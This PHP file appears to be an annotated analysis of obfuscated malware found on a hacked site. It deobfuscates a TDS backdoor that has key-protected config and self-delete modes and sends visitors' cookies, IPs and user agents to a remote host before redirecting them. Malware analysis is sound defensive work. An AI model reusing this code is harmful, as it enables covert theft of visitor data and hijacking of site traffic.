<?php 
//*****************************************************//
//*  Analysis  of the hack file                       *//
//*****************************************************//
//
// Notes: 
// - Run this code at your own risk
//
// I've rearranged the hack code for the readability and analysis - it may not work (not that you should ever run this)



// Script Functions
//===========================

// The masking of the hack code
function _654327255($i){
	$a=Array('Nmh0VHc0OXZE','ZndadFk=','','SCo=','bW9kZQ==','Y29uZmln','a2V5','a2V5','PGZvcm0gbmFtZT0iZm9ybTEiIG1ldGhvZD0icG9zdCIgYWN0aW9uPT9tb2RlPXNldGNvbmZpZyZrZXk9','a2V5','PjxwcmU+ClREUzogICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJwdGRzIiB2YWx1ZT0i','dXJs','Ij4gIFREUyBJUDogIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJwdGRzaXAiIHZhbHVlPSI=','aXA=','Ij4KS0VZOiAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBrZXkiIHZhbHVlPSI=','a2V5','Ij4gIFJlc2VydmU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJwdG8iIHZhbHVlPSI=','bGlu','Ij4KSUQ6ICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBlc2RpZCIgdmFsdWU9Ig==','aWQ=','Ij4gIDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9IlN1Ym1pdCIgdmFsdWU9Im9rIj48L3ByZT4KPC9mb3JtPg==','c2V0Y29uZmln','a2V5','a2V5','Lw==','U0NSSVBUX05BTUU=','dXJs','cHRkcw==','aXA=','cHRkc2lw','bGlu','cHRv','aWQ=','cGVzZGlk','a2V5','cGtleQ==','dw==','','U2F2ZWQuCg==','a2lsbA==','a2V5','a2V5','Nzc3','U0NSSVBUX0ZJTEVOQU1F','U0NSSVBUX0ZJTEVOQU1F','b2sK','Lw==','dXJs','aXA=','aXA=','aHR0cDovLw==','SFRUUF9IT1NU','U0NSSVBUX05BTUU=','UkVNT1RFX0FERFI=','bm8=','SFRUUF9YX0ZPUldBUkRFRF9GT1I=','eWVz','SFRUUF9VU0VSX0FHRU5U','a2V5','Jg==','a2V5','PQ==','UVVFUllfU1RSSU5H','R0VUIA==','dXJs','P2RvbT0=','JnJlZj0=','JmlwPQ==','JnByb3g9','JmFnZW50PQ==','JmNvb2tpZT0=','JmVzZGlkPQ==','aWQ=','IEhUVFAvMS4wDQo=','SG9zdDog','DQo=','Q29ubmVjdGlvbjogQ2xvc2UNCg0K','DQo=','ZG8=','ZG8=','IA==','bGlu','MjAw','bGlu','Oi8v','aHR0cA==','SFRUUC8xLjEgMzAyIEZvdW5k','TG9jYXRpb246IA==','Y29vaw==','Jg==','PQ==','ZWNobw==');
	
	return base64_decode($a[$i]);
} 
//
function string_cpt($String,$Password){
	$Salt=_654327255(1); // 'fwZtY'
	$StrLen=strlen($String); 
	$Seq=$Password;
	$Gamma=_654327255(2); // ''
	while(strlen($Gamma)<$StrLen){
		$Seq=pack(_654327255(3),sha1($Gamma .$Seq .$Salt));
		$Gamma.=substr($Seq,0,8);
	}
	return $String^$Gamma;
}

// ==========================================
//         Step-by-step analysis
// ==========================================
//     1. Turn off error reporting
// ------------------------------------------
// 
error_reporting(0); 
//
//     2. Lots of base64_decoding
// ------------------------------------------

$cfg='JQk9y/WeR3s8IT0hf3AC0fJd8vqY8HGbJTuZpk2hJ6M9L1k2h5O0aW+K+jXe6F99UgdE0HzONy5T4RqejPAg4wkzeiDKANmaFuPyHtL1iGi1LxTcOPPY2NmUP12mLDs0HSdRvSkg/qVnmYRH7sw6JF2+duH8B0wjxuVhA2KOLL/cTotYIs48X1GGEa8QbaZfb4IuphDB7DV9nDxuqXS5Utm9+eJPXC1sVOIlQO7RLZWN+RiiweawWUU='; 

$key=_654327255(0); // selects 'Nmh0VHc0OXZE', returns '6htTw49vD'


// This next statement is packed with complexity:
$c=unserialize(string_cpt(base64_decode($cfg),$key));

// Let's go through this with in-line variable substitution to make sense of it:
function string_cpt(base64_decode($cfg),'6htTw49vD'){

	// a salt.  hmmm, this is probably an encryption algorithm
	$Salt =_654327255(1); // 'fwZtY'
	
	$StrLen =strlen(base64_decode($cfg));   // a very long string
	
	
	$Seq ='6htTw49vD';    // the initial value of the sequence
	
	$Gamma=_654327255(2); // ''  an empty string
	while(strlen($Gamma)< strlen(base64_decode($cfg) ){
		$Seq=pack('H*',sha1($Gamma .$Seq . 'fwZtY'));   
//		PHP MANUAL:
//		-----------
//		pack() — Pack data into binary string
//
//			string pack ( string $format [, mixed $args [, mixed $... ]] )
//							OUR VALUES:
//							$format  = 'H*' <== Hex string, high nibble first
//							$args = sha1 — Calculate the sha1 hash of a string
//
// 		the initial value that is assigned to $Seq: 
//		pack('H*', sha1(''.'6htTw49vD'.'fwZtY'))


		$Gamma.=substr($Seq,0,8);
//		The initially empty string is now concatenating the first 8 characters of $Seq
//		The WHILE loop ensures that every character of $cfg is hashed and stored in $Gamma
		
	}
	return base64_decode($cfg)^$Gamma;
//
//				 ^
//				 - Bitwise XOR and assign operator
//				
//			Returns some pretty nifty binary data preparation
//
}

$mode=$_REQUEST[_654327255(4)]; // $mode = $_REQUEST['mode'];

// =============================================================================== --------- TRANSLATION: ------------------------------------------------------------
	if ($mode== _654327255(5) AND $c[_654327255(6)]==$_REQUEST[_654327255(7)]) {		if ($mode == 'config' AND $c['key'] == $_REQUEST['key']) {
		echo _654327255(8) .																echo '<form name="form1" method="post" action=?mode=setconfig&key=' .
			$_REQUEST[_654327255(9)] .														$_REQUEST['key'] . 
			_654327255(10) .																'><pre>TDS:     <input type="text" name="ptds" value="' .
			$c[_654327255(11)] .															$c['url'] .
			_654327255(12) .																'">  TDS IP:  <input type="text" name="ptdsip" value="' .
			$c[_654327255(13)] .															$c['ip'] .
			_654327255(14) .																'">KEY:     <input type="text" name="pkey" value="'
			$c[_654327255(15)] .															$c['key'] .
			_654327255(16) .																">  Reserve: <input type="text" name="pto" value="
			$c[_654327255(17)] .															$c['lin'] .
			_654327255(18) .																'">ID:      <input type="text" name="pesdid" value="' .
			$c[_654327255(19)] .															$c['id'];
			_654327255(20);																	'">  <input type="submit" name="Submit" value="ok"></pre></form>';
		die();																				die();
	}																					}
//										So, this basically outputs a form
//
//
//
//
//
// =============================================================================== --------- TRANSLATION: ------------------------------------------------------------
	if ($mode== _654327255(21)AND $c[_654327255(22)]==$_REQUEST[_654327255(23)]){		if ($mode== 'setconfig' AND $c['key']==$_REQUEST['key']){		
		$sn=explode(_654327255(24),$_SERVER[_654327255(25)]);								$sn = explode(/, 'SCRIPT_NAME');
																							
		foreach($sn as $snn){																foreach(){$sn as $snn){
			$scr=$snn;																			$scr=$snn;
		}																					}
		$getlpa=file($scr);																	$getlpa=file($scr);
		$strng=$getlpa[0];																	// oddly enough, not needed!
		$file=file($scr);																	$file=file($scr) 
																							
		for($i=0;$i<sizeof($file);$i++)														for($i=0;$i<sizeof($file);$i++)
			if($i==0){																			if($i==0){
				$c[_654327255(26)]=$_POST[_654327255(27)];											$c[_654327255(26)]=$_POST[_654327255(27)];
				$c[_654327255(28)]=$_POST[_654327255(29)];											$c[_654327255(28)]=$_POST[_654327255(29)];
				$c[_654327255(30)]=$_POST[_654327255(31)];											$c[_654327255(30)]=$_POST[_654327255(31)];
				$c[_654327255(32)]=$_POST[_654327255(33)];											$c[_654327255(32)]=$_POST[_654327255(33)];
				$c[_654327255(34)]=$_POST[_654327255(35)];											$c[_654327255(34)]=$_POST[_654327255(35)];
				$c[_654327255(34)]=$_POST[_654327255(35)];											$c[_654327255(34)]=$_POST[_654327255(35)];
				$file[$i]="<?\$cfg='$cfg'; ?>\n";													$file[$i]="<?\$cfg='$cfg'; ?>\n";
			}																				}
																						
		$fp=fopen($scr,_654327255(36));														// !!!!!!!!!!!!!Stopped HERE !!!!!!!!!!!!!!!!!!!!!!!!!!!!
																						
		if(fputs($fp,implode(_654327255(37),$file))) die(_654327255(38));				
																						
		fclose($fp);																	
	}																					
	
	if($mode== _654327255(39)AND $c[_654327255(40)]==$_REQUEST[_654327255(41)]){
		chmod(_654327255(42),$_SERVER[_654327255(43)]);
		
		if(unlink($_SERVER[_654327255(44)]))die(_654327255(45));}
		
		$dom=explode(_654327255(46),$c[_654327255(47)]);
		
		$dom=$dom[2];
		$dhost=$dom;
		if($c[_654327255(48)]){
			$dom=$c[_654327255(49)];
		}
		$fp=fsockopen($dom,80,$errno,$errstr,2);
		
		if(!$fp){
			$res=1;
		} else {
			$t_dom=urlencode(_654327255(50) .$_SERVER[_654327255(51)] .$_SERVER[_654327255(52)]);
			$t_ref=urlencode($_SERVER[HTTP_REFERER]);$t_ip=urlencode($_SERVER[_654327255(53)]);
			$t_prox=_654327255(54);
			
			if($_SERVER[_654327255(55)]){ 
				$t_prox=_654327255(56);
			}
			
			$t_agent=urlencode($_SERVER[_654327255(57)]);
			
			foreach($_COOKIE as $c[_654327255(58)]=>$val){
				$t_cookie=$t_cookie ._654327255(59) .$c[_654327255(60)] ._654327255(61) .$val;
			}
			
			$t_cookie=urlencode($t_cookie);
			
			if(empty($t_cookie)){
				$t_cookie=urlencode($_SERVER[_654327255(62)]);
			}
			
			$out=_654327255(63) .$c[_654327255(64)] ._654327255(65) .$t_dom ._654327255(66) .$t_ref ._654327255(67) .$t_ip ._654327255(68) .$t_prox ._654327255(69) .$t_agent ._654327255(70) .$t_cookie ._654327255(71) .$c[_654327255(72)] ._654327255(73);
			$out .= _654327255(74) .$dhost ._654327255(75);$out .= _654327255(76);fwrite($fp,$out);
			
			while(!feof($fp)){
				$str=fgets($fp,128);$ch.=$str;
				if($str== _654327255(77)&& empty($he)){
					$he=_654327255(78);
				}
				
				if($he== _654327255(79)){$goto.=$str;}
			}
				
			fclose($fp);
		}
		
		$goto=substr($goto,2);
		$ch=explode(_654327255(80),$ch);
		
		if($res){
			$goto=$c[_654327255(81)];
		} 
		
		if($ch[1]== _654327255(82)){}
		else{$goto=$c[_654327255(83)];}
		
		$gotoe=explode(_654327255(84),$goto);
		
		If($gotoe[0]== _654327255(85)){
			header(_654327255(86));
			header(_654327255(87) .$goto);
		}
		
		$goto_body=substr($goto,7);
		If($gotoe[0]== _654327255(88)){
			$gotoee=explode(_654327255(89),$goto_body);
			foreach($gotoee as $setcook){
				$set=explode(_654327255(90),$setcook);
				setcookie($set[0],$set[1]);
			}
		}
		
		If($gotoe[0]== _654327255(91)){echo $goto_body;} 
?>